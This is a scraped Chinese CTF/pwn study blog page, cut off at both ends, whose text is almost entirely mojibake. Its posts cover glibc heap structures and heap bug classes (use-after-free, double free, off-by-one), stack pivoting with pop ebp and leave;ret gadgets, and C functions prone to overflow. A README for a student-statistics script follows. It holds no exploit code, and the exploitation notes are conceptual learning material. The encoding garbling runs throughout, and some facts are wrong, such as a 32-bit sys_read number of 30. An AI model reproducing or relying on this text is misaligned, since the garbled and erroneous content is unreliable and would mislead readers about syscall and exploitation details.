<li>fast bin é‡‡ç”¨LIFOç­–ç•¥,æ”¯æŒçš„æœ€å¤§çš„chunkçš„æ•°æ®ç©ºé—´å¤§å°ä¸º64å­—èŠ‚,æœ€å¤§æ”¯æŒçš„binçš„ä¸ªæ•°ä½10,inuseä½å§‹ç»ˆç½®ä¸º1,é˜²æ­¢è¢«åˆå¹¶</li>
<li>small binsä¸­æ¯ä¸ªchunkçš„å¤§å°ä¸å…¶æ‰€åœ¨binçš„indexçš„å…³ç³»ä¸º:chunk_size = 2*size_sz*index</li>
</ul>
<h5 id="Top-Chunk"><a href="#Top-Chunk" class="headerlink" title="Top Chunk"></a>Top Chunk</h5><p>ç¨‹åºç¬¬ä¸€æ¬¡è¿›è¡Œmallocçš„æ—¶å€™,heapä¼šè¢«åˆ†æˆä¸¤å—,ä¸€å—ç»™ç”¨æˆ·,å‰©ä¸‹çš„é‚£å—å°±æ˜¯Top Chunk(å¤„äºå½“å‰å †çš„ç‰©ç†åœ°å€æœ€é«˜çš„chunk,ä¸å±äºä»»ä½•bin),å®ƒçš„ä½œç”¨æ˜¯åœ¨å½“å‰æ‰€æœ‰binéƒ½æ— æ³•æ»¡è¶³ç”¨æˆ·çš„è¯·æ±‚å¤§å°æ—¶,å¦‚æœå…¶æ»¡è¶³å¤§å°,å°±è¿›è¡Œåˆ†é…,å°†å‰©ä¸‹çš„éƒ¨åˆ†ä½œä¸ºæ–°çš„TopChunk.å¦åˆ™å¯¹heapè¿›è¡Œæ‰©å±•åå†è¿›è¡Œåˆ†é….</p>
<h4 id="å®è§‚ç»“æ„"><a href="#å®è§‚ç»“æ„" class="headerlink" title="å®è§‚ç»“æ„"></a>å®è§‚ç»“æ„</h4><h5 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h5><p>â€‹    ç¨‹åºåˆšå¼€å§‹æ‰§è¡Œæ—¶æ˜¯æ²¡æœ‰heapåŒºåŸŸçš„,å½“å…¶ç”³è¯·å†…å­˜æ—¶,å°±éœ€è¦ä¸€ä¸ªç»“æ„è®°å½•å¯¹åº”çš„ä¿¡æ¯,è€Œä¸”ä¸€èˆ¬å½“å‰çš„heapèµ„æºè¢«ç”¨å®Œå,é‡æ–°ç”³è¯·çš„heapä¸€èˆ¬æ˜¯ä¸è¿ç»­çš„,å› æ­¤éœ€è¦è®°å½•ä¸åŒheapä¹‹é—´è¿æ¥ç»“æ„,è€Œheapçš„ä½œç”¨å°±æ˜¯è¿™ä¸ª</p>
<h5 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h5><p>è¯¥ç»“æ„ç”¨äºç®¡ç†å †,è®°å½•æ¯ä¸ªarenaå½“å‰ç”³è¯·å†…å­˜çš„å…·ä½“çŠ¶æ€,æ¯”å¦‚æ˜¯å¦æœ‰ç©ºé—²çš„chunkç­‰,ä»–æ˜¯ä¸€å…¨å±€å˜é‡å­˜å‚¨åœ¨libc.soä¸­</p>
<h3 id="3-æ·±å…¥ç†è§£å †çš„å®ç°"><a href="#3-æ·±å…¥ç†è§£å †çš„å®ç°" class="headerlink" title="3.æ·±å…¥ç†è§£å †çš„å®ç°"></a>3.æ·±å…¥ç†è§£å †çš„å®ç°</h3><p>å®è§‚è§’åº¦</p>
<pre><code>- åˆ›å»ºå †
- å †åˆå§‹åŒ–
- åˆ é™¤å †
</code></pre><p>å¾®è§‚è§’åº¦</p>
<ul>
<li>ç”³è¯·å†…å­˜å—</li>
<li>é‡Šæ”¾å†…å­˜å—</li>
</ul>
<h3 id="3-ç›¸å…³çš„æ¼æ´"><a href="#3-ç›¸å…³çš„æ¼æ´" class="headerlink" title="3.ç›¸å…³çš„æ¼æ´"></a>3.ç›¸å…³çš„æ¼æ´</h3><h4 id="1-æœ€åŸºæœ¬çš„å †æ¼æ´"><a href="#1-æœ€åŸºæœ¬çš„å †æ¼æ´" class="headerlink" title="1. æœ€åŸºæœ¬çš„å †æ¼æ´"></a>1. æœ€åŸºæœ¬çš„å †æ¼æ´</h4><ul>
<li>ç”±äºå¯¹å †å†…å®¹ç±»å‹åˆ¤æ–­ä¸æ˜è€Œå½¢æˆçš„é”™è¯¯å¼•ç”¨,é€šå¸¸æƒ…å†µä¸‹,å¯ä»¥ä½¿ç”¨å †å—å­˜å‚¨å¤æ‚çš„ç»“æ„ä½“,å…¶ä¸­å¯èƒ½ä¼šåŒ…æ‹¬å‡½æ•°æŒ‡é’ˆã€å˜é‡ã€æ•°ç»„ç­‰æˆå‘˜.å¦‚æœä¸€ä¸ªç»“æ„ä½“æ•°æ®æŒ‰ç…§å…¶ä»–ç»“æ„ä½“æ ¼å¼æ¥è§£æ,é‚£ä¹ˆåªè¦åœ¨ç‰¹å®šçš„åŸŸå¸ƒç½®å¥½æ•°æ®,å°±ä¼šå¯¼è‡´æ¼æ´çš„å‘ç”Ÿ.</li>
</ul>
<h4 id="2-å †ç¼“å†²åŒºæº¢å‡º"><a href="#2-å †ç¼“å†²åŒºæº¢å‡º" class="headerlink" title="2.å †ç¼“å†²åŒºæº¢å‡º"></a>2.å †ç¼“å†²åŒºæº¢å‡º</h4><ol>
<li><p>å¸¸è§„æº¢å‡º</p>
<p>å †ç¼“å†²åŒºæº¢å‡ºä¸æ ˆç¼“å†²åŒºæº¢å‡ºç±»ä¼¼</p>
</li>
<li><p>Off By One</p>
<p>åªèƒ½æº¢å‡ºä¸€å­èŠ‚,é€šå¸¸ä½äºå †å—æœ«å°¾,æº¢å‡ºçš„1å­èŠ‚æ°å¥½èƒ½å¤Ÿè¦†ç›–ä¸‹ä¸€å †å—çš„sizeåŸŸçš„æœ€ä½ä½,éš¾ä»¥åˆ©ç”¨,ä¸€èˆ¬æœ‰å›ºå®šçš„å¥—è·¯</p>
</li>
<li><p>Use After Free</p>
<p>è‹¥å †æŒ‡é’ˆåœ¨é‡Šæ”¾åæœªè¢«ç½®ç©º,å½¢æˆæ‚¬æŒ‚æŒ‡é’ˆ(é‡æŒ‡é’ˆ),å½“ä¸‹æ¬¡è®¿é—®è¯¥æŒ‡é’ˆæ—¶,ä¾ç„¶èƒ½å¤Ÿè®¿é—®åˆ°åŸå§‹æŒ‡é’ˆæŒ‡å‘çš„å †å†…å®¹</p>
<ol>
<li>ç”³è¯·ä¸€æ®µç©ºé—´,å¹¶å°†å…¶é‡Šæ”¾,é‡Šæ”¾åå¹¶ä¸å°†æŒ‡é’ˆç½®ä¸ºç©º,å› æ­¤è¿™ä¸ªæŒ‡é’ˆä»ç„¶å¯ä»¥ä½¿ç”¨,æŠŠè¿™ä¸ªæŒ‡é’ˆç®€ç§°ä¸ºp1</li>
<li>ç”³è¯·ç©ºé—´p2,ç”±äºmallocåˆ†é…è¿‡ç¨‹ä½¿å¾—p2æŒ‡å‘çš„ç©ºé—´ä¸ºåˆšåˆšé‡Šæ”¾çš„p1æŒ‡é’ˆçš„ç©ºé—´,æ„é€ æ¶æ„æ•°æ®å°†è¿™æ®µå†…å­˜ç©ºé—´å¸ƒå±€å¥½,æ—¢è¦†ç›–p1ä¸­çš„æ•°æ®</li>
<li>å¯åˆ©ç”¨p1,ä¸€èˆ¬å¤šæœ‰ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆ,ç”±äºä¹‹å‰å·²ç»ä½¿ç”¨P2å°†P1ä¸­çš„æ•°æ®è¦†ç›–äº†,æ‰€ä»¥æ­¤æ—¶çš„æ•°æ®å³æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„,æ—¢å­˜åœ¨åŠ«æŒå‡½æ•°æµçš„æƒ…å†µ</li>
</ol>
</li>
<li><p>Doubble Free</p>
<p>å¯¹æŒ‡é’ˆè¿›è¡Œå¤šæ¬¡é‡Šæ”¾.å¤šæ¬¡é‡Šæ”¾ä¼šä½¿å †å—å‘ç”Ÿé‡å ,å‰åç”³è¯·çš„å †å—å¯èƒ½ä¼šæŒ‡å‘åŒä¸€å—å†…å­˜</p>
</li>
</ol>

      
    </div>
    
      <div class="full-width auto-padding tags">
        
          <a href="/tags/PWN-CTF/" rel="nofollow"><i class="fas fa-hashtag fa-fw"></i>PWN CTF</a>
        
      </div>
    
  </section>
</article>

          </div>
        
      
        
          <div class="post-wrapper">
            <article class="post reveal ">
  


  <section class="meta">
    
    
    <div class="meta" id="header-meta">
      
        
  <h2 class="title">
    <a href="/2020/12/12/PWN-å †æ ˆå¹³è¡¡/">
      PWN-å †æ ˆå¹³è¡¡
    </a>
  </h2>


      
      <div class="new-meta-box">
        
          
        
          
            
  <div class="new-meta-item author">
    <a href="http://yoursite.com" rel="nofollow">
      
        <i class="fas fa-user" aria-hidden="true"></i>
      
      <p>John Doe</p>
    </a>
  </div>


          
        
          
            <div class="new-meta-item date">
  <a class="notlink">
    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
    <p>2020-12-12</p>
  </a>
</div>

          
        
          
            

          
        
          
            

          
        
          
            

          
        
      </div>
      
        <hr>
      
    </div>
  </section>


  <section class="article typo">
    <div class="article-entry" itemprop="articleBody">
      <h2 id="å †æ ˆå¹³è¡¡å’Œæ ˆè½¬ç§»"><a href="#å †æ ˆå¹³è¡¡å’Œæ ˆè½¬ç§»" class="headerlink" title="å †æ ˆå¹³è¡¡å’Œæ ˆè½¬ç§»"></a>å †æ ˆå¹³è¡¡å’Œæ ˆè½¬ç§»</h2><h3 id="1-æ ˆå¹³è¡¡"><a href="#1-æ ˆå¹³è¡¡" class="headerlink" title="1.æ ˆå¹³è¡¡"></a>1.æ ˆå¹³è¡¡</h3><h4 id="1-ä¸ºä»€ä¹ˆéœ€è¦å †æ ˆå¹³è¡¡"><a href="#1-ä¸ºä»€ä¹ˆéœ€è¦å †æ ˆå¹³è¡¡" class="headerlink" title="1.ä¸ºä»€ä¹ˆéœ€è¦å †æ ˆå¹³è¡¡?"></a>1.ä¸ºä»€ä¹ˆéœ€è¦å †æ ˆå¹³è¡¡?</h4><ul>
<li>ä¿æŒæ ˆçš„å¤§å°,æ˜¯ESPå§‹ç»ˆæŒ‡å‘æ ˆé¡¶</li>
</ul>
<h4 id="2-æ¦‚å¿µ"><a href="#2-æ¦‚å¿µ" class="headerlink" title="2.æ¦‚å¿µ"></a>2.æ¦‚å¿µ</h4><ul>
<li>å‡½æ•°å¦‚æœè¦è¿”å›çˆ¶ç¨‹åº,åˆ™åœ¨å †æ ˆä¸­è¿›è¡Œæ“ä½œæ—¶,ä¸€å®šè¦åœ¨RETæŒ‡ä»¤ä¹‹å‰,å°†ESPæŒ‡å‘å‡½æ•°å‹å…¥æ ˆä¸­æ—¶çš„åœ°å€</li>
<li>å¦‚æœé€šè¿‡å †æ ˆä¼ é€’å‚æ•°äº†,é‚£ä¹ˆåœ¨å‡½æ•°æ‰§è¡Œå®Œæ¯•å,è¦å¹³è¡¡å‚æ•°å¯¼è‡´çš„å †æ ˆå˜åŒ–</li>
</ul>
<h4 id="3-æ€»ç»“"><a href="#3-æ€»ç»“" class="headerlink" title="3.æ€»ç»“"></a>3.æ€»ç»“</h4><ul>
<li>å½“å‡½æ•°åœ¨æ ˆä¸­æ“ä½œæ—¶,éœ€è¦å…ˆæŠŠESPäº¤ç»™<strong>EBP</strong>,ç„¶åç»§ç»­æ“ä½œ,å½“æ“ä½œå®Œæˆå,åœ¨<strong>ret</strong>ä¹‹å‰,è¦å…ˆå°†<strong>ESP</strong>æ¢å¤æˆè¿›å…¥æ ˆä¹‹å‰çš„çŠ¶æ€,æœ€åå†å°†<strong>EBP</strong>ç§»é™¤æ ˆ</li>
</ul>
<h3 id="2-æ ˆè½¬ç§»"><a href="#2-æ ˆè½¬ç§»" class="headerlink" title="2.æ ˆè½¬ç§»"></a>2.æ ˆè½¬ç§»</h3><h4 id="1-ä¸ºä»€ä¹ˆéœ€è¦æ ˆè½¬ç§»"><a href="#1-ä¸ºä»€ä¹ˆéœ€è¦æ ˆè½¬ç§»" class="headerlink" title="1.ä¸ºä»€ä¹ˆéœ€è¦æ ˆè½¬ç§»?"></a>1.ä¸ºä»€ä¹ˆéœ€è¦æ ˆè½¬ç§»?</h4><ul>
<li>åœ¨æ ˆç©ºé—´ä¸å¤Ÿå­˜æ”¾payloadçš„æƒ…å†µä¸‹,éœ€è¦ä¸€ä¸ªæ–°çš„åœ°å€ç©ºé—´å­˜æ”¾payload</li>
<li>å¼€å¯PIEä¿æŠ¤,æ ˆåœ°å€æœªçŸ¥,æˆ‘ä»¬å¯ä»¥å°†æ ˆåŠ«æŒåˆ°å·²çŸ¥çš„åŒºåŸŸ</li>
</ul>
<h4 id="2-æ¦‚å¿µ-1"><a href="#2-æ¦‚å¿µ-1" class="headerlink" title="2.æ¦‚å¿µ"></a>2.æ¦‚å¿µ</h4><ul>
<li>åŠ«æŒæ ˆçš„rsp(ESP),ä½¿å…¶æŒ‡å‘å…¶ä»–ä½ç½®,å½¢æˆä¸€ä¸ªä¼ªé€ çš„æ ˆ,åœ¨æ­¤æ ˆä¸­åšROP</li>
</ul>
<h4 id="3-å¿…è¦çš„gadget"><a href="#3-å¿…è¦çš„gadget" class="headerlink" title="3.å¿…è¦çš„gadget"></a>3.å¿…è¦çš„gadget</h4><ul>
<li>pop ebp;ret   é‡Šæ”¾EBP,å¹¶è¿æ¥ä¼ªé€ çš„æ ˆ</li>
<li>leave;ret æ›´æ”¹ESP,æŒ‡å‘åç»­çš„payload</li>
</ul>
<h4 id="4-åŸç†"><a href="#4-åŸç†" class="headerlink" title="4.åŸç†"></a>4.åŸç†</h4><ul>
<li>é€šè¿‡ <strong>pop ebp;ret + ä¼ªé€ çš„æ ˆ</strong>è®©ç¨‹åºç›´æ¥è·³è½¬åˆ°ä¼ªé€ çš„æ ˆé‡Œé¢,ç„¶åä¸ºäº†ä¿æŒæ ˆå¹³è¡¡,ä»è€Œæ‰§è¡Œ <strong>leave ;ret</strong>,æœ€åç»§ç»­æ‰§è¡Œä¼ªé€ æ ˆå†…çš„payload</li>
</ul>
<h4 id="5-è¿‡ç¨‹"><a href="#5-è¿‡ç¨‹" class="headerlink" title="5.è¿‡ç¨‹"></a>5.è¿‡ç¨‹</h4><ul>
<li>ä½¿ç”¨è¾“å…¥å‡½æ•°(å¦‚read),å°†åç»­çš„payloadåŠ è½½åˆ°bssæ®µå†…,ä¹Ÿå°±æ˜¯ä¼ªé€ çš„æ ˆ</li>
<li>é€šè¿‡ <strong>pop ebp;ret | pop ebx;ret</strong> æ¥è°ƒæ•´EBPå¯„å­˜å™¨</li>
<li>é€šè¿‡ <strong>leave ret;</strong> æ¥æ›´æ”¹ <strong>ESP</strong>,ä½¿å…¶æŒ‡å‘ä¼ªé€ çš„æ ˆ</li>
<li>ç„¶ååœ¨ä¼ªé€ çš„æ ˆä¸­æ‰§è¡Œä¸‹ä¸€æ®µROP</li>
</ul>

      
    </div>
    
      <div class="full-width auto-padding tags">
        
          <a href="/tags/PWN-CTF/" rel="nofollow"><i class="fas fa-hashtag fa-fw"></i>PWN CTF</a>
        
      </div>
    
  </section>
</article>

          </div>
        
      
        
          <div class="post-wrapper">
            <article class="post reveal ">
  


  <section class="meta">
    
    
    <div class="meta" id="header-meta">
      
        
  <h2 class="title">
    <a href="/2020/12/12/PWN-å¸¸è§å±é™©å‡½æ•°/">
      PWN-å¸¸è§å±é™©å‡½æ•°
    </a>
  </h2>


      
      <div class="new-meta-box">
        
          
        
          
            
  <div class="new-meta-item author">
    <a href="http://yoursite.com" rel="nofollow">
      
        <i class="fas fa-user" aria-hidden="true"></i>
      
      <p>John Doe</p>
    </a>
  </div>


          
        
          
            <div class="new-meta-item date">
  <a class="notlink">
    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
    <p>2020-12-12</p>
  </a>
</div>

          
        
          
            

          
        
          
            

          
        
          
            

          
        
      </div>
      
        <hr>
      
    </div>
  </section>


  <section class="article typo">
    <div class="article-entry" itemprop="articleBody">
      <h1 id="CTF-PWN"><a href="#CTF-PWN" class="headerlink" title="CTF-PWN"></a>CTF-PWN</h1><h2 id="å¸¸è§çš„å±é™©å‡½æ•°"><a href="#å¸¸è§çš„å±é™©å‡½æ•°" class="headerlink" title="å¸¸è§çš„å±é™©å‡½æ•°"></a>å¸¸è§çš„å±é™©å‡½æ•°</h2><ul>
<li><p>gets() æ²¡æœ‰æ£€æŸ¥è¾¹ç•Œ</p>
<ul>
<li>é€šè¿‡è®¡ç®—å‡½æ•°çš„åç§»é‡,é€šè¿‡æ„é€ payloadè¾¾åˆ°æº¢å‡º</li>
</ul>
</li>
<li><p>fgets(buf, 40, stdin)</p>
<ul>
<li>èƒ½å¤Ÿæ¥å—39Byte,æœ€åä¸€ä¸ªå­—èŠ‚ä¸ºNULL</li>
<li>å¦‚æœbufçš„é•¿åº¦æ²¡æœ‰39ä¹Ÿå¯ä»¥é€ æˆæº¢å‡º</li>
</ul>
</li>
<li><p>read(stdin, buf, 40)</p>
<ul>
<li>ä»è¾“å…¥ä¸­è¯»å–40ä¸ªByte,åˆ°buf,æœ€åçš„å­—èŠ‚å¯ä»¥ä¸æ˜¯NULL</li>
<li><p>å¯èƒ½ä¼šé€ æˆä¿¡æ¯çš„æ³„æ¼</p>
</li>
<li><p>read(0,buf,0x20) ä»ç”¨æˆ·è¾“å…¥è¯»å–32ä¸ªå­—ç¬¦</p>
</li>
</ul>
</li>
<li><p>Write(int fd, buf, nbytes)</p>
<ul>
<li>fd è¾“å‡ºæè¿° 1</li>
<li>buf ä¸ºè¦å†™å…¥åˆ°æ•°æ®çš„ç¼“å†²åŒºåœ°å€</li>
<li>nbytesä¸ºè¦å†™å…¥çš„æ•°æ®çš„å­—èŠ‚æ•°</li>
</ul>
</li>
<li><p>strcpy</p>
</li>
<li><p>memcpy</p>
</li>
<li><p>scanfï¼ˆâ€œ%sâ€ï¼Œbuffï¼‰</p>
</li>
<li><p>syscallç³»ç»Ÿè°ƒç”¨</p>
<ul>
<li><p>æ“ä½œç³»ç»Ÿå®ç°ç³»ç»Ÿè°ƒç”¨çš„åŸºæœ¬è¿‡ç¨‹æ˜¯:</p>
<ul>
<li>åº”ç”¨ç¨‹åºè°ƒç”¨åº“å‡½æ•°(API)</li>
<li>APIå°†ç³»ç»Ÿè°ƒç”¨å·å­˜å…¥EAX,ç„¶åé€šè¿‡ä¸­æ–­è°ƒç”¨ä½¿ç³»ç»Ÿè¿›å…¥å†…æ ¸æ€</li>
<li>å†…æ ¸ä¸­ç»ˆç«¯å¤„ç†å‡½æ•°æ ¹æ®ç³»ç»Ÿè°ƒç”¨å·,è°ƒç”¨å¯¹åº”çš„å†…æ ¸å‡½æ•°(ç³»ç»Ÿè°ƒç”¨)</li>
<li>ç³»ç»Ÿè°ƒç”¨å®Œæˆç›¸åº”çš„åŠŸèƒ½,å°†è¿”å›å€¼å­˜å…¥EAX,è¿”å›åˆ°ä¸­æ–­å¤„ç†å‡½æ•°</li>
<li>ä¸­æ–­å¤„ç†å‡½æ•°è¿”å›åˆ°APIä¸­</li>
<li>APIå°†EAXè¿”å›ç»™åº”ç”¨ç¨‹åº</li>
</ul>
</li>
<li><p>åº”ç”¨ç¨‹åºè°ƒç”¨ç³»ç»Ÿè°ƒç”¨çš„è¿‡ç¨‹</p>
<ul>
<li>æŠŠç³»ç»Ÿè°ƒç”¨çš„ç¼–å·å­˜å…¥EAX</li>
<li>æŠŠå‡½æ•°å‚æ•°å­˜å…¥å…¶ä»–é€šç”¨å¯„å­˜å™¨</li>
<li>è§¦å‘0x80å·ä¸­æ–­(int 0x80)</li>
</ul>
</li>
<li><p>ä»¥ä¸Šæ˜¯32ä½çš„ç³»ç»Ÿè°ƒç”¨,ä¸64 ä½çš„åŒºåˆ«æ˜¯</p>
<ul>
<li><p>ä¼ å‚æ–¹å¼ä¸åŒ</p>
<ul>
<li>32ä½<ul>
<li>å…ˆå°†ç³»ç»Ÿè°ƒç”¨å·ä¼ å…¥eax,ç„¶åå°†å‚æ•°ä»å·¦åˆ°å³ä¾æ¬¡å­˜å…¥ebx,ecx,edxå¯„å­˜å™¨ä¸­,è¿”å›å€¼å­˜åœ¨eaxä¸­</li>
</ul>
</li>
<li>64ä½<ul>
<li>å…ˆå°†ç³»ç»Ÿè°ƒç”¨å·ä¼ å…¥rax,ç„¶åä¼ å‚æ•° ä»å·¦åˆ°å³ä¾æ¬¡å­˜å…¥rdi,rsi,rdxå¯„å­˜å™¨ä¸­,è¿”å›å€¼å­˜åœ¨raxå¯„å­˜å™¨</li>
</ul>
</li>
</ul>
</li>
<li><p>ç³»ç»Ÿè°ƒç”¨å·ä¸åŒ</p>
<ul>
<li>32ä½<ul>
<li>sys_read çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º 30 sys_write çš„ç³»ç»Ÿè°ƒç”¨å·ä¸º4</li>
</ul>
</li>
<li>64ä½<ul>
<li>sys_readçš„è°ƒç”¨å·ä½0,sys_writeçš„è°ƒç”¨å·ä¸º1äº¿</li>
</ul>
</li>
</ul>
</li>
<li><p>è°ƒç”¨æ–¹å¼ä¸åŒ</p>
<ul>
<li>â€‹    32ä½<ul>
<li>ä½¿ç”¨int 80 ä¸­æ–­è¿›è¡Œç³»ç»Ÿè°ƒç”¨</li>
</ul>
</li>
<li>64ä½<ul>
<li>ä½¿ç”¨syscallè¿›è¡Œç³»ç»Ÿè°ƒç”¨</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>

      
    </div>
    
      <div class="full-width auto-padding tags">
        
          <a href="/tags/PWN-CTF/" rel="nofollow"><i class="fas fa-hashtag fa-fw"></i>PWN CTF</a>
        
      </div>
    
  </section>
</article>

          </div>
        
      
        
          <div class="post-wrapper">
            <article class="post reveal ">
  


  <section class="meta">
    
    
    <div class="meta" id="header-meta">
      
        
  <h2 class="title">
    <a href="/2020/10/21/ä¸œå—å¤§å­¦é’å¹´å¤§å­¦ä¹ ç»Ÿè®¡/">
      ä¸œå—å¤§å­¦æ— é”¡åˆ†æ ¡é’å¹´å¤§å­¦ä¹ ç»Ÿè®¡
    </a>
  </h2>


      
      <div class="new-meta-box">
        
          
        
          
            
  <div class="new-meta-item author">
    <a href="http://yoursite.com" rel="nofollow">
      
        <i class="fas fa-user" aria-hidden="true"></i>
      
      <p>John Doe</p>
    </a>
  </div>


          
        
          
            <div class="new-meta-item date">
  <a class="notlink">
    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
    <p>2020-10-21</p>
  </a>
</div>

          
        
          
            

          
        
          
            

          
        
          
            

          
        
      </div>
      
        <hr>
      
    </div>
  </section>


  <section class="article typo">
    <div class="article-entry" itemprop="articleBody">
      <h1 id="ä¸œå—å¤§å­¦é’å¹´å¤§å­¦ä¹ ç»Ÿè®¡"><a href="#ä¸œå—å¤§å­¦é’å¹´å¤§å­¦ä¹ ç»Ÿè®¡" class="headerlink" title="ä¸œå—å¤§å­¦é’å¹´å¤§å­¦ä¹ ç»Ÿè®¡"></a>ä¸œå—å¤§å­¦é’å¹´å¤§å­¦ä¹ ç»Ÿè®¡</h1><h2 id="è¿è¡Œæˆªå›¾"><a href="#è¿è¡Œæˆªå›¾" class="headerlink" title="è¿è¡Œæˆªå›¾"></a>è¿è¡Œæˆªå›¾</h2><p><img src="/2020/10/21/ä¸œå—å¤§å­¦é’å¹´å¤§å­¦ä¹ ç»Ÿè®¡/1.png" alt="image.png"></p>
<h2 id="ç¯å¢ƒå®‰è£…"><a href="#ç¯å¢ƒå®‰è£…" class="headerlink" title="ç¯å¢ƒå®‰è£…"></a>ç¯å¢ƒå®‰è£…</h2><ul>
<li><p>ä½ å¯ä»¥æŒ‰ç…§ä¸‹é¢çš„æ–¹å¼ä¸‹è½½ä»£ç åˆ°æœ¬åœ°</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth 1 https://github.com/huzai9527/studyAnalysis.git SUSmember-dev</span><br></pre></td></tr></table></figure>
</li>
<li><p>æœ¬é¡¹ç›®åœ¨<strong>python 3</strong> ä¸‹è¿è¡Œ,å¹¶ä¸”ä¾èµ–<strong>pands</strong>,ä½ å¯ä»¥åœ¨ç»ˆç«¯è¿è¡Œä»¥ä¸‹å‘½ä»¤è¿›è¡Œå®‰è£…</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pandas</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="æ‰€éœ€è¦çš„æ–‡ä»¶ä»¥åŠæ ¼å¼"><a href="#æ‰€éœ€è¦çš„æ–‡ä»¶ä»¥åŠæ ¼å¼" class="headerlink" title="æ‰€éœ€è¦çš„æ–‡ä»¶ä»¥åŠæ ¼å¼"></a>æ‰€éœ€è¦çš„æ–‡ä»¶ä»¥åŠæ ¼å¼</h2><ul>
<li>æœ¬é™¢æ€»åå•,æŒ‰ç…§å¦‚ä¸‹æ ¼å¼,é¦–è¡Œä¸ºç­çº§åç§°,é¦–åˆ—ä¸ºç´¢å¼•å·(excelè‡ªå¸¦),å°†ç­çº§åŒå­¦åå­—æ›¿æ¢å³å¯<br><img src="/2020/10/21/ä¸œå—å¤§å­¦é’å¹´å¤§å­¦ä¹ ç»Ÿè®¡/2.png" alt="image.png"></li>
<li>ç­çº§ç´¯è®¡åˆ†æ•°:é¦–è¡Œä¸ºåˆ—åç¬¬ä¸€åˆ—åˆ—åç©º,ç¬¬äºŒåˆ—åˆ—åç´¯è®¡åˆ†æ•°</li>
<li>ç¬¬ä¸€åˆ—ä¸ºå¡«ç­çº§å,ç¬¬äºŒåˆ—ä¸ºä¿å­˜çš„ç­çº§å<br><img src="/2020/10/21/ä¸œå—å¤§å­¦é’å¹´å¤§å­¦ä¹ ç»Ÿè®¡/3.png" alt="image.png"></li>
<li>æœ€åæ˜¯å¤§å­¦ä¹ çš„ç»Ÿè®¡æƒ…å†µ,æ­¤æ–‡ä»¶æ˜¯ä¸Šçº§ä¸‹å‘çš„,åªè¦ç§»åˆ°æ­¤ç›®å½•å³å¯<br><img src="/2020/10/21/ä¸œå—å¤§å­¦é’å¹´å¤§å­¦ä¹ ç»Ÿè®¡/4.png" alt="image.png"></li>
<li><p><strong>æ³¨:</strong> æ€»åå•ä»¥åŠç­çº§ç´¯è®¡åˆ†æ•°å¯ä»¥åœ¨ä¸‹è½½å¥½çš„æ–‡ä»¶ä¸­ç›´æ¥ä¿®æ”¹</p>
<h2 id="å®‰è£…å¥½ç¯å¢ƒä»¥åŠå‡†å¤‡å¥½ç›¸åº”æ–‡ä»¶å-åœ¨ç»ˆç«¯è¿è¡Œ-æ–‡ä»¶ç›®å½•è·¯å¾„ä¸‹"><a href="#å®‰è£…å¥½ç¯å¢ƒä»¥åŠå‡†å¤‡å¥½ç›¸åº”æ–‡ä»¶å-åœ¨ç»ˆç«¯è¿è¡Œ-æ–‡ä»¶ç›®å½•è·¯å¾„ä¸‹" class="headerlink" title="å®‰è£…å¥½ç¯å¢ƒä»¥åŠå‡†å¤‡å¥½ç›¸åº”æ–‡ä»¶å,åœ¨ç»ˆç«¯è¿è¡Œ(æ–‡ä»¶ç›®å½•è·¯å¾„ä¸‹)"></a>å®‰è£…å¥½ç¯å¢ƒä»¥åŠå‡†å¤‡å¥½ç›¸åº”æ–‡ä»¶å,åœ¨ç»ˆç«¯è¿è¡Œ(æ–‡ä»¶ç›®å½•è·¯å¾„ä¸‹)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python SUSmember.py æ— é”¡åˆ†æ ¡-ä¸œå—-ç¬¬åä¸€æœŸ</span><br></pre></td></tr></table></figure>
</li>
<li><p>è¿è¡Œå®Œæˆè¾“å‡ºï¼Œå„ç­è¯¦ç»†æƒ…å†µï¼Œå¹¶åœ¨ç»“æœæ–‡ä»¶å¤¹ç”ŸæˆEXCELLç»Ÿè®¡æ–‡ä»¶<br><img src="/2020/10/21/ä¸œå—å¤§å­¦é’å¹´å¤§å­¦ä¹ ç»Ÿè®¡/5.png" alt="image.png"></p>
</li>
</ul>
<h2 id="æœ‰ä¸æ˜¯å›¢å‘˜çš„åªè¦åœ¨æ€»åå•ä¸­åˆ é™¤å³å¯"><a href="#æœ‰ä¸æ˜¯å›¢å‘˜çš„åªè¦åœ¨æ€»åå•ä¸­åˆ é™¤å³å¯" class="headerlink" title="æœ‰ä¸æ˜¯å›¢å‘˜çš„åªè¦åœ¨æ€»åå•ä¸­åˆ é™¤å³å¯"></a>æœ‰ä¸æ˜¯å›¢å‘˜çš„åªè¦åœ¨æ€»åå•ä¸­åˆ é™¤å³å¯</h2>
      
    </div>
    
      <div class="full-width auto-padding tags">
        
          <a href="/tags/æ•°æ®åˆ†æ/" rel="nofollow"><i class="fas fa-hashtag fa-fw"></i>æ•°æ®åˆ†æ</a>
        
      </div>
    
  </section>
</article>

          </div>
        
      
        
          <div class="post-wrapper">
            <article class="post reveal ">
  


  <section class="meta">
    
    
    <div class="meta" id="header-meta">
      
        
  <h2 class="title">
    <a href="/2020/10/17/SSMæ¡†æ¶æ•´åˆ/">
      SSMæ¡†æ¶æ•´åˆ
    </a>
  </h2>


      
      <div class="new-meta-box">
        
          
        
          
            
  <div class="new-meta-item author">
    <a href="http://yoursite.com" rel="nofollow">
      
        <i class="fas fa-user" aria-hidden="true"></i>
      
      <p>John Doe</p>
    </a>
  </div>


          
        
          
            <div class="new-meta-item date">
  <a class="notlink">
    <i class="fas fa-calendar-alt" aria-hidden="true"></i>
    <p>2020-10-17</p>
  </a>
</div>

          
        
          
            

          
        
          
            

          
        
          
            

          
        
      </div>
      
        <hr>
      
    </div>
  </section>


  <section class="article typo">
    <div class="article-entry" itemprop="articleBody">
